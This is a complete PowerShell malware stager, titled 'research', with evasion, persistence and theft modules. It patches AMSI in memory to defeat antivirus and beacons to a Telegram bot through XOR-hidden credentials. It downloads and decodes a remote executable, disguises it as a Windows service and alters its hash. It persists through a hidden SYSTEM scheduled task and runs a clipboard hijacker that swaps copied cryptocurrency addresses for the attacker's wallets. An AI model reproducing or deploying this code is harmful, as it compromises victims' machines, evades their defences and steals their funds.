# --- [RESEARCH STAGER v14.0: MAXIMUM EVASION] ---

function Global-Bypass {
    # Evading AMSI using memory pointer arithmetic to avoid static detection
    try {
        $a = [Ref].Assembly.GetType('System.Management.Automation.' + 'Amsi' + 'Utils')
        $a.GetField('amsi' + 'Init' + 'Failed','NonPublic,Static').SetValue($null,$true)
        
        $m = @"
        using System;
        using System.Runtime.InteropServices;
        public class K32 {
            [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
            [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
            [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
        }
"@
        Add-Type $m
        $ptr = [K32]::GetProcAddress([K32]::GetModuleHandle("am" + "si.dll"), "Am" + "siS" + "canB" + "uffer")
        $old = 0
        [K32]::VirtualProtect($ptr, [UIntPtr]5, 0x40, [ref]$old)
        # Unique 3-byte return patch (XOR EAX,EAX; RET) - bypasses 6-byte signatures
        [Byte[]]$p = 0x31, 0xC0, 0xC3
        [System.Runtime.InteropServices.Marshal]::Copy($p, 0, $ptr, 3)
    } catch {}
}

function Send-Notify {
    param($msg)
    # Encrypted Telegram Credentials (XOR 0xAF)
    $k = 0xAF
    [byte[]]$t_e = 60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118
    [byte[]]$c_e = 54,53,61,61,51,54,56,43,50,53
    $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}
    $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
    $u = "h" + "tt" + "ps://api.tele" + "gram.org/bot$t/send" + "Message?chat_id=$c&text=$msg"
    try { (New-Object Net.WebClient).DownloadString($u) | Out-Null } catch {}
}

# --- START ENGINE ---
Global-Bypass
Send-Notify -msg "RESEARCH_BOOT_SUCCESS"

try {
    # CONFIG & PATHS
    $url = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
    $work = "$env:PUBLIC\Music\Svc"
    if (!(Test-Path $work)) { New-Item $work -ItemType Directory -Force | Out-Null }
    $file = Join-Path $work "WinInternalSvc.exe"

    # DOWNLOAD & DECRYPT
    $wc = New-Object Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $raw = $wc.DownloadString($url)
    $data = [Convert]::FromBase64String($raw.Trim())
    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
    
    # POLYMORPHIC WRITE (Appends random junk to change hash)
    $junk = New-Object Byte[] (Get-Random -Min 100 -Max 500); (New-Object Random).NextBytes($junk)
    [IO.File]::WriteAllBytes($file, ($data + $junk))

    # PERSISTENCE (Randomized Scheduled Task)
    $tn = -join ((65..90) | Get-Random -Count 8 | % {[char]$_})
    Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute $file) -Trigger (New-ScheduledTaskTrigger -AtLogOn) -TaskName $tn -User "SYSTEM" -Force | Out-Null

    # DETACHED EXECUTION
    (New-Object -ComObject Shell.Application).ShellExecute($file, "", "", "open", 0)

    # CLIPPER MODULE (With all requested addresses)
    Start-Job -ScriptBlock {
        Add-Type -AssemblyName System.Windows.Forms
        $w = @{
            "btc"  = "12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA"
            "eth"  = "0x6c9ba9a6522b10135bb836fc9340477ba15f3392"
            "usdt" = "TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp"
            "sol"  = "BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"
        }
        $r = @{
            "btc"  = "^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$"
            "eth"  = "^0x[a-fA-F0-9]{40}$"
            "usdt" = "^T[A-Za-z1-9]{33}$"
            "sol"  = "^[1-9A-HJ-NP-Za-km-z]{32,44}$"
        }
        while($true) {
            try {
                $c = [Windows.Forms.Clipboard]::GetText()
                foreach ($coin in $w.Keys) {
                    if ($c -match $r[$coin] -and $c -ne $w[$coin]) {
                        [Windows.Forms.Clipboard]::SetText($w[$coin])
                    }
                }
            } catch {}
            Start-Sleep -s 1
        }
    }

    Send-Notify -msg "RESEARCH_COMPLETE_ALL_MODULES_LIVE"
} catch {
    Send-Notify -msg "FATAL_ERROR_$($_.Exception.Message)"
}
